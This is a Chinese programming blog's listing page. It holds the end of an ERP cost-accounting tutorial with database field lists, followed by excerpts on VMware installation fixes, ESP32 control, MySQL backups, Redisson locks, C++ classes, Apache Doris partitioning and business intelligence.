10、下面内容是要边归集边分配边核算。即必需是前面的分配并核算完成后，再分配核算后面的，因为后面的归集数据来自于前面的分配核算结果。成本核算单可一次全部填制完成，归集单要等到上一步核算完成后才能填制。
11、会计核算要将制造费用内容核算完毕。
二、成本归集与核算：成本归集单 成本归集、分配、核算要按产品层次依次进行，实际应用中，根据真实的层次确定核算的层次，就是说要前一层次核算产生结果后，用于后面层次的计算。
（一）、外协品成本核算 1、成本归集，只有一张单据，来源是委外出库单数据。填制、审核、登记。
2、成本分配（业务处理）。成本分配的结果被存储在djcbgjs表中，并在单据头中加上是否分配的标记。
3、成本核算。将分配结果更新到成本核算单，再由成本核算单更新到入库单。成本核算时自动存货核算，不需要单独操作。
4、成本分配与成本核算可以重复进行。
5、成本归集单允许反登记。
6、成本核算单允许反登记。反登记将清除原有分配的结果。但更新到入库单上的入库金额将无法恢复，直到重新计算出正确的结果后再更新。当然可以在后台用语句或建立业务处理功能，将其他恢复为计划成本价格。
7、使用成本账项查询功能，查询并核对核算结果的正确性。
8、查询核算后的入库单。
9、查询存货账项。
（二）、初级半成品成本核算 1、核算钣金车间生产的机箱的入库成本。
2、成本归集：直接材料、直接人工、制造费用。审核登记。
3、需要先行在会计核算中核算制造费用，因此我们回到会计核算。
4、成本分配。
5、成本核算。
6、单据查询：成本归集单、成本核算单。
7、账项查询：成本类账项。核实分配结果的正确性。
（三）、次级半成品成本核算 1、核算组装车间生产的祼机的入库成本。
2、成本归集：直接材料、直接人工、制造费用。审核登记。
3、成本分配。
4、成本核算。
5、单据查询：成本归集单、成本核算单。
6、账项查询：成本类账项。核实分配结果的正确性。
（四）产成品成本核算 1、核算检测车间生产的产成品的入库成本。
2、成本归集：直接材料、直接人工、制造费用、管理费用。审核登记。
3、成本分配。
4、成本核算。
5、单据查询：成本归集单、成本核算单。
三、成本核算原则 1、决策导向。分配标准以不影响销售决策为准。即售价较高的产品可以多摊成本，反之少摊成本。
2、订单决策。以订单决策为目标，而不是单一产品决策。即只要某一订单满足毛利指标要求即可，不求其中每一种产品都是满足要求的。
3、及时完成。在没有实际成本时，以标准成本或计划成本为依据完成计算。
4、本期完工的成本核算对象承担间接成本和期间费用。
5、完全成本。期间费用分配到产成品成本，不分配给半成品。
四、主要数据表结构 -- 成本核算单单据头 djcbhso字段列表： oid varchar 30	单据号 textread	djmc varchar 60	单据名称 textread	ny bpchar 6	年月 textread	dqbz varchar 40	当前步骤 textread	rq date 0	日期 dateedit	yyyy-MM-dd scbm varchar 100	生产部门 textedit	hslb varchar 40	核算类别 comboedit	edit bz varchar 300	备注 textedit	tzr varchar 20	填制人 textedit	shr varchar 20	审核人 textedit	djr varchar 20	登记人 textedit	sfhs bool 0	是否核算 checkedit	-- 成本核算单单据体,存储成本核算对象和核算结果 djcbhsm字段列表： mid int4 32	序号 textread	oid varchar 30	单据号 textread	djmc varchar 60	单据名称 textread	ny bpchar 6	年月 textread	dqbz varchar 40	当前步骤 textread	chxh varchar 20	货号 buttonedit	chdh varchar 30	存货代号 notenter	chmc varchar 100	存货名称 notenter	xh1 varchar 100	型号 textread	xh2 varchar 100	规格 textread	xh3 varchar 400	参数 textedit	gg1 varchar 200	颜色 textedit	gg2 varchar 200	材质 textread	gg3 varchar 200	图号 textread	jldw varchar 20	单位 notenter	scbm varchar 100	生产部门 textedit	wldw varchar 100	往来单位 textedit	hssl numeric 16	核算数量 textedit	n2 xsje numeric 16	销售金额 textedit	n2 dwcb numeric 16	单位成本 textedit	n2 cpcb numeric 16	产品成本 textedit	n2 dwml numeric 16	单位毛利 textedit	n2 cpml numeric 16	产品毛利 textedit	n2 bz varchar 100	备注 textedit	mhh int4 32	行号 textedit	zjcl numeric 16	直接材料 textedit	n2 zjrg numeric 16	直接人工 textedit	n2 jjcl numeric 16	间接材料 textedit	n2 jjrg numeric 16	间接人工 textedit	n2 zzfy numeric 16	制造费用 textedit	n2 glfy numeric 16	管理费用 textedit	n2 sfsh bool 0	是否审核 checkedit	sfdj bool 0	是否登记 checkedit	-- 成本归集单单据头 djcbgjo字段列表： oid varchar 30	单据号 textread	djmc varchar 60	单据名称 textread	ny bpchar 8	年月 textread	dqbz varchar 40	当前步骤 textread	rq date 0	日期 dateedit	yyyy-MM-dd scbm varchar 100	生产部门 textedit	xmdh varchar 12	项目代号 buttonedit	xmmc varchar 100	项目名称 textread	xmlx varchar 60	项目类型 comboedit	fpfw varchar 500	分配范围 buttontextedit	bz varchar 300	备注 textedit	tzr varchar 20	填制人 textedit	shr varchar 20	审核人 textedit	djr varchar 20	登记人 textedit	sffp bool 0	是否分配 checkedit	-- 成本归集单单据体 djcbgjm字段列表： mid int4 32	序号 textread	oid varchar 30	单据号 textread	djmc varchar 60	单据名称 textread	ny bpchar 6	年月 textread	dqbz varchar 40	当前步骤 textread	cbmc varchar 150	成本名称 buttonedit	jldw varchar 12	单位 textread	select gjsl numeric 16	归集数量 textedit	n2 cbdj numeric 16	成本单价 textedit	n2 cbje numeric 16	成本金额 textedit	n2 fpje numeric 16	分配金额 textedit	n2 cbyt varchar 20	成本用途 textedit	00000 scbm varchar 100	生产部门 listedit	wldw varchar 200	往来单位 textedit	lyxh varchar 20	来源货号 textedit	bz varchar 100	备注 textedit	mhh int4 32	行号 textedit	sfsh bool 0	是否审核 checkedit	sfdj bool 0	是否登记 checkedit	sffp bool 0	是否分配 checkedit	-- 成本归集单分配结果 djcbgjs字段列表： id int4 32	键号 textedit	ny bpchar 6	年月 textread	djmc varchar 60	单据名称 textread	oid varchar 30	单据号 textread	mid int4 32	序号 textread	cbmc varchar 100	成本名称 textedit	jldw varchar 12	单位 buttonedit	gjsl numeric 16	归集数量 textedit	n2 cbdj numeric 16	成本单价 textedit	n2 cbje numeric 16	成本金额 textedit	n2 cbyt varchar 20	成本用途 textedit	hsoid varchar 30	textedit	bz varchar 100	备注 textedit	xmdh varchar 12	项目代号 buttonedit	xmmc varchar 100	项目名称 textread	xmlx varchar 20	项目类型 comboedit	scbm varchar 100	生产部门 listedit	wldw varchar 200	往来单位 buttonedit	sfdj bool 0	是否登记 checkread	五、关键代码 本例使用plpgsql语言编写。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ee1fe124f22ff4e4f7f4f74e0dce5a2e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b1a96a098bdebcbaefd48f06ea8b378/" rel="bookmark">
			调试webapck源码方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考文章：WebPack 02：利用 VS Code 进行调试 - 爱码帮™分享编程知识和开发经验
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a5c075abfac66a4584ed4828fff4cdfe/" rel="bookmark">
			关于VMware虚拟机安装失败的解决办法，报错（29142）或者安装系统后无法启动
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		关于VMware虚拟机安装失败的解决办法，报错（29142）或者安装系统后无法启动 如果首次安装，那么安装前要检查，cpu是否开启虚拟化，hyper是否关闭1.查看cpu是否开启虚拟化注意：1.系统中是否关闭了内核隔离1.如果是安装完成之后卸载再次安装的情况下：首先：注意： 如果首次安装，那么安装前要检查，cpu是否开启虚拟化，hyper是否关闭 1.查看cpu是否开启虚拟化 win10需要打开任务管理器，点击性能，查看是否开启cpu虚拟化功能，如果没有开启虚拟化的话那就需要从bios中开启虚拟化，具体方法可自行百度， 我本身电脑thinkpad p15 gen2 需要在开机时按下F1进bios，找到security，然后查看里面的 Virtualization选项，进入页面后如果是老版的bios直接设置成enable即可，如果是新版的bios的话需要关闭第一项（具体名字忘了意思是内核隔离），然后你才可以选择Virtualization对其进行操作，这里的内核隔离需要关闭掉。 注意： 有些朋友的电脑在查看电脑cpu是否开启虚拟化的时候显示是开启的，但是还是安装不成功，可能是因为内核隔离没有关闭（这个问题困扰了自己一晚上+一个下午，后来自己去查了一下中文什么意思然后才明白的）。 1.系统中是否关闭了内核隔离 如果系统中没有关闭内核隔离，那么也会出现虚拟机无法安装的情况。如果下面的图没有说明白具体在哪里，直接百度内核隔离即可找到。
1.如果是安装完成之后卸载再次安装的情况下： 首先： 1.你需要将VMware从系统中删除， 2.使用everything将剩余的VMware删除 注意： 这里使用everything删除的时候看清楚，别把自己的镜像还有安装包也删掉，换句话说就是不要一股脑全部删掉，否则很容易后悔，不过也还有解决办法，就是回收站恢复一下。但是很多人比如我就直接吧回收站也删了。。。。。。 3.使用Ccleaner将注册表中的问题统统解决掉。具体做法：玩电脑的应该看到自己的这个界面就知道怎么操作了。 至于这个软件当然是免费提供的啦，哈哈哈哈哈。
软件链接：
链接：https://pan.baidu.com/s/1s4kXiJLKN__zxVtWLlBztw?pwd=4ogp
提取码：4ogp
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5962c663304c4a5391bd88cb8343db26/" rel="bookmark">
			blinker小白入门学习_esp32
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		持续更新
应用：远程控制esp32的io。
先看官方给的示例点灯科技 (diandeng.tech)
#define BLINKER_WIFI #include &lt;Blinker.h&gt; char auth[] = "Your Device Secret Key"; char ssid[] = "Your WiFi network SSID or name"; char pswd[] = "Your WiFi network WPA password or WEP key"; // 新建组件对象 BlinkerButton Button1("btn-abc"); BlinkerNumber Number1("num-abc"); int counter = 0; // 按下按键即会执行该函数 void button1_callback(const String &amp; state) { BLINKER_LOG("get button state: ", state); digitalWrite(LED_BUILTIN, !digitalRead(LED_BUILTIN)); } // 如果未绑定的组件被触发，则会执行其中内容 void dataRead(const String &amp; data) { BLINKER_LOG("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5962c663304c4a5391bd88cb8343db26/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9542468d218d7b53d1b0b699222523c5/" rel="bookmark">
			无线传感器网络WSN覆盖优化问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、相关基础1 相关概念2 相关分类2.1 按节点部署方式分类2.2 按覆盖目标分类2.3 按网络中的传感器类型分类2.4 传感器种类2.5 地形分类 3 评价指标3.1 覆盖率3.2 均匀度3.3 节点移动距离3.4 连通性3.5 能耗和寿命3.6 信息传输数量3.7 算法复杂度 二、相关模型1 传感器节点感知模型1.1 布尔感知模型（图a）1.2 概率感知模型（图b） 2 簇头选择模型2.1 江西理工 3 虚拟力算法4 三维相关算法 一、相关基础 1 相关概念 无线传感器网络（Wireless Sensor Networks，WSNs）是一种分布式传感网络，嵌入了传感器的智能设备感测、通信、处理、收集数据，然后通过互联网将数据传输给监测者进行进一步分析，是通过无线通信方式形成的一个多跳自组织网络，可用于大规模物联网应用。由于其传感器通过无线方式通信，所以位置可以随时更改，非常灵活。WSN的覆盖优化问题可以描述为在规定的监测区域内，保证传感器网络连通情况下的节点部署问题。
WSNs系统包括三部分：
（1） 传感器节点本质是一个小型嵌入式系统，由传感器模块、处理器模块、无线通信模块、能量供应模块四部分组成，既可充当数据发送者也可充当中间路由者。负责收集本地信息和处理数据（存储，管理，融合），向其它传感器节点传输数据，与其它传感器节点协作完成一些任务；
（2）汇聚节点负责将传感器节点收集到的数据汇聚到一起，再通过无线通信方式传送到管理节点；
（3）管理节点是终端监测平台，用户通过管理节点对WSNs进行配置管理，发布监测任务及收集监测数据等。
传感器节点监测的数据经过多跳后传输到汇聚节点，然后通过互联网或卫星到达管理节点。
WSN可以被定义为下图具有三层的二维网络，最底层为分布在目标区域的传感器节点，有若干个簇，每个簇都有一个簇头（汇聚节点），这些簇头组成了中间层，每个传感器节点都可以直接与它们的簇头通信，簇头可以与顶层的Sink节点（管理节点）通信。
每轮数据传输分为两个阶段：在簇的建立阶段中，每一轮都先选择最佳部署解决方案 I ，再选举簇头（每一轮的簇头都可以不一样），然后分组（非簇头节点计算与所有簇头的通信消耗，选最低的簇头）。在传输数据阶段中，簇头收集簇内传感器节点的数据，然后发送给sink节点。
WSNs应用：军事航空，环境监测，医疗保健，工业制造，智慧交通，智慧家庭，智慧城市，救灾等。
存在的问题：覆盖盲区（不够），节点冗余（太多，浪费），处理能力、存储能力、通信能力较弱
2 相关分类 2.1 按节点部署方式分类 静态WSN：在网络运行前就确定节点的位置，部署后不再做移动。动态WSN：所有节点（传感器节点和汇聚节点）都可移动，根据网络的具体需求（网络扩展、故障修复等）进行动态部署。混合WSN：多数固定节点 + 少数移动节点，主要解决的是移动节点的自我调整部署问题。 2.2 按覆盖目标分类 点覆盖：如图（a）又叫目标覆盖，图（a）圆点为传感器节点，方块为监测目标，要求每个目标至少被一个传感器节点覆盖。栅栏覆盖：如图（b），要求传感器节点监测移动目标的运动轨迹。主要用于国防边境的非法越境者探测，军事战场敌军入侵侦查，环境保护中的物种迁徙监测等。区域覆盖：如图（c），要求用尽可能少的传感器节点尽量覆盖整个目标区域。 主要用于森林火灾预警，湖泊水面水质监测等大规模应用环境，或者煤矿巷道，工厂车间，仓库等受限区域的安全监控应用。 2.3 按网络中的传感器类型分类 同构WSNs：传感器类型一样，网络同质；异构WSNs：传感器类型和感知能力都不一样；在未来的智能城市中，WSNs将是异构的。 2.4 传感器种类 全向传感器：二维为圆盘，三维为球，只有覆盖和非覆盖，非0即1，一般基于确定性布尔模型，在实际应用中，各种能力会随着距离增加而降低；定向传感器：各种能力会随着距离和角度增加而降低。 2.5 地形分类 平面：二维的；马鞍地形：三维的，如图a；多峰地形：三维的，如图b，比前两种更复杂。 在三维环境中，无线信号会沿着传输路径被反射、散射、衍射。
3 评价指标 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9542468d218d7b53d1b0b699222523c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3709b858c39dad3bf1d79d2bd5db187a/" rel="bookmark">
			echarts 在图表内显示数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		echarts 在图表内显示数据 - 简书 (jianshu.com)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/93bbfcf2d2eab60392ea399852a89474/" rel="bookmark">
			centos MYSQL数据库备份
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、部署步骤1. 编写执行sh脚本1.1 普通mysql的备份命令1.2 如果是docker内的mysql执行1.3忽略指定表 2.设置定时任务 写在最后 前言 这里我们使用centos的crontab实现定时任务，mysql的mysqldump实现将数据库导出为sql文件，结合实现mysql的定时备份
一、部署步骤 1. 编写执行sh脚本 1.1 普通mysql的备份命令 例如，我们在home目录下新建一个脚本automysqlbackup.sh，脚本内容如下：
如果是shell环境下执行命令如下： mysqldump -uroot -p密码 数据库名称 | gzip &gt; /home/mysql/backup/数据库名称_`date '+%m-%d-%Y'`.sql.gz 1.2 如果是docker内的mysql执行 docker exec -i docker的id mysqldump -uroot -p数据库密码 数据库名称 | gzip &gt; /data/backup/mysql_backup/data/数据库名称_`date '+%m-%d-%Y'`.sql.gz 1.3忽略指定表 mysqldump --ignore-table=数据库名称.表名称
2.设置定时任务 如果是root用户最好，直接输入下面命令：
crontab -e 然后输入需要执行的命令，这里我们直接去执行刚才的脚本：
00 00 * * * /home/automysqlbackup.sh 此命令代表00 00 * * *代表每天凌晨执行一次脚本；我们也可以自己在线去写一个表达式自定义执行的时间；
推荐一个crontab执行时间计算 - 在线工具
写在最后 这里就是目前安装mysql的所有步骤，如果帮到你，可以请作者喝一杯咖啡，鼓励作者继续写出有用的教程，帮助正在努力学习的你。
微信
支付宝：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5924010d0c593e17ee58108c3c7398c0/" rel="bookmark">
			简洁易懂：源码&#43;实战讲解Redisson并发锁及看门狗自动续期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 缘起 有一次同事问Redisson存储的键是否为hash？
我当时，没有看Redisson的相关源码，只知道应用，
所以没有办法回答，于是开始看看Redisson实现的源码，
顺便写了一个单机Redisson测试，
发现Redisson有看门狗功能，但是，不是所有的方法都会触发，
只有lock()方法才会触发看门狗，其他的方法不会触发看门狗功能，
如lock(long, TimeUnit)，tryLock()，
本文从结果触发，先理论分析，然后，代码实践验证。
先从源码讲解Redisson相关的知识，包括如何新建锁、释放锁、看门狗功能，
然后代码实战，验证这些功能，
感兴趣的同学可以手动调试。
帮助读者轻松应对知识交流与考核。
版本信息：
SpringBoot：2.1.7
Redisson：3.7.5
2 Redisson属性源码分析与验证 2.1 新建锁 位置：org.redisson.RedissonLock#tryLockInnerAsync
新建锁和可重入源码如下图所示，由源码可知，
Redisson使用Lua脚本新建锁。
为什么？
保证操作原子性。
因为新建数据和添加过期时间是两步操作，不能保证原子性，
因此使用Lua实现，保证新建锁时是原子操作。 Redisson实现的锁是可重入的。同一个线程获取锁，无需重新排队申请，只需增加锁的持有次数。
怎么做？
判断锁是的属性是否存在。
通过hexists判断锁的属性是否存在（UUID:threadId），如果存在，值+1，同时，更新锁过期时间，
使用Lua脚本，保证原子性。 Lua脚本中的参数KEYS[1]，ARGV[1], ARGV[2]，
分别对应哪些参数呢？
KEYS[1]：Collections.singletonList(getName())，即锁的键名；
ARGV[1]：internalLockLeaseTime，即锁过期时间；
ARGV[2]：getLockName(threadId)，即锁（Hash）属性的键，UUDI:threadId。
其中，getLockName源码如下图所示，由图可知，UUID拼接threadId作为锁属性的键。
顺便补充一下，Hash结构，键名，即获取该Hash的键，属性键名，即Hash内部数据的键。 下面看一下新建锁的调试过程，如下图所示，
（单步调试，如果操作不及时或者有其他时延，会导致Redis数据过期，因此，选择单步调试）
由图可知，新建的锁，键名称为redisLockKey，
默认锁过期时间为30秒，UUID为edb0f8cb-ec11-4b29-a107-12be152c4a5e，
threadId为71，锁属性的键为：edb0f8cb-ec11-4b29-a107-12be152c4a5e:71，属性键的值为1。
新建锁之后，会在Redis生成对应的数据，
如下图所示，由图可知，Redisson新建的锁键为redisLockKey，
锁属性名称为：edb0f8cb-ec11-4b29-a107-12be152c4a5e:71，属性值为1。
过期时间TTL已经开始倒计时了，实时的值为17秒。
2.2 获取锁 Redisson获取锁有两种方式：lock获取和tryLock获取。
lock()获取锁，如果得不到，会一直等，同时，lock()会开启看门狗功能，在看门狗巡查期间，锁不会过期；
lock(long, java.util.concurrent.TimeUnit)获取锁，会一直等，当锁过期后，即可自动获取；
tryLock()获取锁，得不到会一直等，当锁过期后，可自动获取到；
tryLock(long, long, java.util.concurrent.TimeUnit)获取锁，有两个时间参数，可以同时指定等待锁的最大时间，以及锁过期时间，如果等待最大时间大于锁过期时间，则锁被提前释放，重新生成锁；
2.2.1 lock 位置：java.util.concurrent.locks.Lock#lock
无参的lock方法来自JUC接口，
Redisson自身实现lock，并加入看门狗功能。
无返回值。
Redisson的实现源码如下图所示，这里给出路径，感兴趣可自行查看。
位置：org.redisson.RedissonLock#lock()
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5924010d0c593e17ee58108c3c7398c0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ac97d13de934664d87dda81bc11f2e4/" rel="bookmark">
			opencv 问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CV_DbgAssert(data);
0x7599B922 处(位于 Project1.exe 中)引发的异常: Microsoft C++ 异常: cv::Exception，位于内存位置 0x0053E480 处。
解决方法：Mat类的at函数报错CV_DbgAssert(data)，出现未经处理的异常。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a28f071b6231cb6436c70c8ef04f61bb/" rel="bookmark">
			C&#43;&#43;类和对象超详细
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		👦个人主页zoroxs
本文对C++中的类和对象知识,进行详细的解释,包括,如何定义类,默认成员函数,运算符重载…
没有涉及到继承和多态,之后会详细介绍
本文目录 类和对象初阶类的定义类的访问限定符类的作用域类的实例化类对象大小的计算特殊情况 this指针this指针相关经典题目 类和对象进阶六大默认成员函数构造函数编译器自动生成的会干什么事情构造函数特性 析构函数定义我们什么时候需要写析构函数 拷贝构造函数拷贝构造写法我们不写编译器默认生成的拷贝构造会做什么事??拷贝构造调用 赋值运算符重载运算符重载赋值运算符重载前置++和后置++运算符重载 取地址以及const取地址操作符重载const对象调用 初始化列表1.每个成员变量在初始化列表中只能出现一次(初始化只能初始化一次)2.类中包含以下成员,必须在初始化列表位置进行初始化3.尽量使用初始化列表初始化，因为不管你是否使用初始化列表，对于自定义类型成员变量，一定会先使用初始化列表初始化4.成员变量在类中声明次序就是其在初始化列表中的初始化顺序，与其在初始化列表中的先后次序无关 explicit关键字 static成员静态成员的特性 友元友元类 内部类匿名对象拷贝对象时优化总结 类和对象初阶 类的定义 在C语言中,只有结构体的概念,没有类,而C++是兼容C语言的,所以在C++中定义类有两种方式
struct classname { //成员变量 //成员函数 }; class classname { //成员变量 //成员函数 }; 这两种定义方式肯定是有区别的,后边再说
定义类一定要注意,{}结尾有分号,其实基本和C语言定义结构体是一样的,只不过里面可以定义函数
我们这样就可以简单写一个类了
万年不变的学生类, 不过使用class定义类这样是无法初始化对象的,往后看
类的访问限定符 public成员在类外面可以访问protected 和 private 只能在类里面访问,类外都不能访问protected和private的区别: 继承的时候,protected成员可以继承到子类,但是private成员是不可见的,子类无法访问 访问权限的作用域从当前访问权限符出现,到下一个访问权限操作符出现为止class的默认访问权限符是private(私有), struct的默认访问权限符是public(公有),主要是为了兼容C语言 所以上边使用class写的那个学生类是不可以用的,因为默认是private,所以要添加访问权限控制符
一般都会把成员变量设置成私有的,成员函数设置成公有的,因为封装的特性,要隐藏内部实现细节,对外公开接口
类的作用域 类定义了一个新的作用域，类的所有成员都在类的作用域中。在类体外定义成员时，需要使用 ::作用域操作符指明成员属于哪个类域。
比如要声明和定义分离:
如果访问类中静态成员也是要这样访问
类的实例化 类的实例化就是创建对象
一个类可以实例化出多个对象,
类本身是没有空间的, 实例化出对象才会分配空间, 类就好像建造图纸一样, 而对象才是房子
我们可以在栈上定义局部对象,也可以在堆上申请,切记要释放哦
类对象大小的计算 我们知道,在C语言中可以使用sizeof来计算对象所占的空间,单位是字节,比如 sizeof(int)的返回值就是4
C++是兼容C语言的,那么如何计算一个对象的大小呢
规则和C语言计算结构体是一样的,那么怎么计算呢,我们来看看,涉及到的问题就是结构体内存对齐
规则有4条:
第一个成员与结构体变量偏移量为0的地址处其他成员变量要对齐到 对齐数 的整数倍的地址处 对齐数 : 编译器默认对齐数与该成员大小的较小值 (vs中默认对齐数的值为8)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a28f071b6231cb6436c70c8ef04f61bb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2bc9e56e1a3a56968aaa0a831828562/" rel="bookmark">
			Fre-gan: Adversarial frequency-consistent audio synthesis
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 interspeech202Korea UniversityJi-Hoon Kim abstract 神经网络声码器在面对频率域真实谱和生成谱的不同时，会产生比如嘶嘶声，回声等噪音。本文的Fre-GAN可以完成更高质量的合成：（1）提出resolution-connected generator和resolution-wise discriminator，有助于在多个频带中学习多样的谱分布。（2）在判别器中使用离散小波变换代替average pooling作为降采样的方法，因为DWT可以确保所有的信息被保留，而AP会洗掉一些高频的成分。 intro 该图证明降采样过程中使用DWT比AP损失的高频信息少。 Fre-GAN Resolution-connected Generator（RCG） 生成器输入mel-spec，输出采样点，结构：上采样卷积，不同上采样率的top-K输出求和，得到最终预测的输出；通过使用Nearest Neighbor (NN) upsampler，可以消除上采样卷积带来的tonal artifacts；RCG结构的优点：（1）不同分辨率的波形求和可以捕捉不同层级的谱分布；有助于模型学到multi-frequency band的谱特征（2）RCG是一种渐进式学习的方法，先学习简单的，再学习难的，有助于模型训练加速和稳定。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/aa2aa7b077a5f3251d42715c921ff39f/" rel="bookmark">
			一文教你玩转 Apache Doris 分区分桶新功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据分片（Sharding）是分布式数据库分而治之 (Divide And Conquer) 这一设计思想的体现。过去的单机数据库在大数据量下往往面临存储和 IO 的限制，而分布式数据库则通过数据划分的规则，将数据打散分布至不同的机器或节点上，形成分布式存储，因此突破了单机存储空间和 IO 的瓶颈、使库表数据量可以无限拓展。
数据分片主要有范围分片或哈希分片这两种方式，而在实际数据库的实现中，往往呈现为分区和分桶两种形式。分区一般是按照时间或其他连续值对数据进行划分，在执行查询操作时可以通过分区裁剪过滤不必要的范围扫描，提升执行效率，同时也使得对分区数据的增删改等管理操作更为便捷。而分桶则是按照某个关键字执行哈希运算，将相同哈希值的数据放到一起，这样可以有效定位数据、避免数据倾斜。
在 Apache Doris 中，同样也遵从一定的数据分布规则。数据以关系表（Table）的形式进行呈现，会依次按照先分区（Partition）、再分桶（Bucket）的方式划分，最终在同一个分桶中的数据会形成数据分片（Tablet）。Tablet 是 Apache Doris 中多副本高可用、集群间数据调度与均衡的最小物理存储单位。
图1：Table-Partition-Tablet 之间的关系
# 现状与问题 在 Doris 中，分区与分桶是如何创建的？我们以一个网站站点的建表实例说明分区与分桶的创建方式，该网站的站点建表语句如下：
-- 该表记录了某个时间点，在某个站点上各个用户的pv数据 CREATE TABLE demo.test_tbl( sdate DATETIME, -- 日期 site INT, -- 站点id city VARCHAR(64), -- 城市 user VARCHAR(32) DEFAULT '', -- 用户名 pv BIGINT -- pv量 ) ENGINE=olap DUPLICATE KEY(sdate, site, city) [PARTITION_DESC] [BUCKET_DESC] PROPERTIES ("replication_num" = "1"); 其中 [PARTITION_DESC] 表示创建分区的详细语句，[BUCKET_DESC] 表示创建分桶的语句。
创建分区 Apache Doris 支持两种分区形式，List Partition 与 Range Partition。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/aa2aa7b077a5f3251d42715c921ff39f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/462ab6b89d93edd7ddc2e303e26693cf/" rel="bookmark">
			BI到底能给管理带来什么价值？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 有这么一个神秘的行业，很多人都觉得自己应该挺了解，但到底是做什么的就搞不明白，这个行业就是“BI“、”大数据”。更神奇的是，BI这个行业，不光外行迷茫，从业者更迷茫，而且是干的越久越迷茫：商务智能、大数据，入行的时候高大上，彷佛即将到达人生巅峰；项目做了一个又一个，人被整的越来越迷惑：这个智能到底体现在哪？BI到底能给企业管理带来什么价值？凭什么BI会成为企业数字化转型的核心系统呢？不光是不理解，很多甲方或者乙方的朋友，对BI还有两个超级巨大的误解：
误解一叫“花瓶”：有些人认为，BI本质上就是一个面子工程，美其名日“大屏”、“管理驾驶舱”，花里胡哨，华而不实，老板基本不看，企业基本不用，故名“花瓶”；
误解二叫“报表生成器”：意思是BI就是一个自动化报表工具，主要的功能是从数据仓库里实时生成各种明细报表，给“表哥表姐们”解放工作量用的，就是一个干脏活累活的工具，故名“报表生成器”。
如果你没有理解BI的真正价值和设计方法，只把它当做一个纯粹的技术工具，有这么两个误解也属实正常，但是很可惜，BI能给你的企业产生的价值也就非常有限了。
所以，什么是真正的BI？ BI到底能给管理者提供什么价值？我们应该怎么做BI呢？ 这是我们最应该搞清楚但是经常搞不清楚的几个问题。现在我们就来系统地说一说：
通俗的讲，BI就是一个给企业看病治病预防疾病的工具。看的什么病？就是企业管理的各种问题（疾病）。企业管理看上去是一个非常复杂的系统，但事实上，很多管理者最后想治的病（希望解决的问题），往往症结点就在那一两个地方。正所谓“牵一发而动全身”，如果能找到这些问题背后的根本原因并及时改善，不仅很快就能治好企业的病，还能给企业带来整体业绩的优化。所以BI和企业管理的连接点在于：如何利用BI找到每一个管理问题背后的本质原因？找到了又如何监控和改善？这就触及到了我们BI的灵魂工程：指标体系与场景设计了！
下面我来举一个很简单的例子，看看如何设计一个有灵魂的BI场景。我以我们智扬的BI设计方法论为基础，带着大家深入了解：
第一步：我们把企业的核心目标，用数字量化成一个个指标，类似销售额、利润率等等，这些最核心的指标统称为结果指标，它代表了企业决策层最关心的问题。比如，今天有家企业得了一个病，它的销售收入连续多年没有达标，它希望利用BI找到该问题的原因并得到改善和解决，所以我们要观测的核心结果指标叫做销售收入。下面我们就用BI来找出“销售收入”没有达标的核心原因了。
第二步：我们识别出这个结果指标之后，把它背后的关键驱动要素找出来。比如销售收入这个指标的驱动要素是销售数量、价格，其中销售数量又可以分解为潜在客户数、一次成交率、客均需求总数和合作转化率这四个指标的乘积关系，这些驱动要素我们定义为“驱动类指标”。驱动类指标和结果指标的关系就形成了一个指标公式，这些驱动类的指标代表了企业的中层干部最关心的问题。假设，我们通过BI实时发现，这个企业的这些驱动指标当中，潜在客户数这个指标是表现最差的，那这又是什么原因造成的呢？
